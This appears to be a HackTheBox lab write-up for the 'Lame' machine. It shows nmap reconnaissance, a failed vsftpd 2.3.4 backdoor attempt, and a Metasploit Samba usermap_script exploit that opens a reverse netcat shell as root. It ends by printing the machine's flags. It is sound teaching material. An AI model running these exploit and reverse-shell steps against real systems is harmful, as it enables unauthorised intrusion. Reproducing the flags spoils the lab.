---
title: "HackTheBox Lame Walkthrough"
description: 'Lame walkthrough focusing on exploiting the vsftpd 2.3.4 backdoor vulnerability to achieve Remote Code Execution (RCE) and privilege escalation to root using Samba 3.0.20 "username map script" command execution vulnerability.'
date: 2025-10-10
tags: ["RCE","Vulnerability Assesment","Samba"]
image: '/public/static/htb-cover.jpg'
authors: ['chjwoo']
---

## Reconnaissance

First we need to enumerate running services by using nmap tool

```bash
┌──(chjwoo㉿hackbox)-[~/hackthebox/machines/lame]
└─$ sudo nmap -sVC -Pn 10.129.255.119 --min-rate=1000 -T4 -oA nmap_results             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 21:02 WIB
Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 21:02 (0:00:00 remaining)
Nmap scan report for 10.129.255.119
Host is up (0.034s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.62
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m36s, deviation: 2h49m46s, median: 33s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-10-10T10:03:05-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.94 seconds

```

### Analyzing scan result

- Port 21, running FTP service with version vsftpd 2.3.4
- Port 22, running SSH service with version OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
- Port 139 and 445, running SAMBA service for file transfer

So there’s vulnerability in vsftpd 2.3.4 version that we can try to exploit. I’m using metasploit and refering to this website [https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)

```bash
└─$ msfconsole   
Metasploit tip: You can upgrade a shell to a Meterpreter session on many 
platforms using sessions -u <session_id>
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt

       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. S
                                       upported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-
                                       metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)

Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.

msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.129.255.119
RHOSTS => 10.129.255.119
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 10.129.255.119:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.255.119:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf exploit(unix/ftp/vsftpd_234_backdoor) > 

```

## Foothold

But unfortunately, the exploit didn’t work. so we must try another entry point. There’s vulnerability in Samba 3.0.20 CVE-2007-2447. Refer to this website [https://security.snyk.io/vuln/SNYK-UNMANAGED-SAMBA-2370409](https://security.snyk.io/vuln/SNYK-UNMANAGED-SAMBA-2370409)

We can just directly hit that CVE with metasploit by using this script exploit/multi/samba/usermap_script.

```bash
└─$ msfconsole 
Metasploit tip: Use the resource command to run commands from a file
                                                  
Call trans opt: received. 2-19-98 13:24:18 REC:Loc
                                                                                                        
     Trace program: running                                                                             
                                                                                                        
           wake up, Neo...                                                                              
        the matrix has you                                                                              
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com

       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution
[-] Parse error: Unmatched quote: "search Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution"
msf > search Samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script                                                                                                    

msf > user exploit/multi/samba/usermap_script
[-] Unknown command: user. Did you mean use? Run the help command for more details.
msf > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. S
                                       upported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-
                                       metasploit/basics/using-metasploit.html
   RPORT    139              yes       The target port (TCP)

Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.198.129  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.

msf exploit(multi/samba/usermap_script) > set LHOST 10.10.14.62
LHOST => 10.10.14.62
msf exploit(multi/samba/usermap_script) > set LPORT 7777
LPORT => 7777
msf exploit(multi/samba/usermap_script) > set RHOSTS 10.129.255.119
RHOSTS => 10.129.255.119                                                                                
msf exploit(multi/samba/usermap_script) > exploit                                                       
[*] Started reverse TCP handler on 10.10.14.62:7777                                                     
[*] Command shell session 1 opened (10.10.14.62:7777 -> 10.129.255.119:43299) at 2025-10-10 21:15:24 +0700                                                                                                      
                                                                                                        
id                                                                                                      
uid=0(root) gid=0(root)                                    
```

And yup we already got the shell with root privilege.

## Flags

```bash
User's Flag : 0df361763536aecc207cb23e0fa88579
Root's Flag : b1dbd88d77697415b6633ef93ba205be
```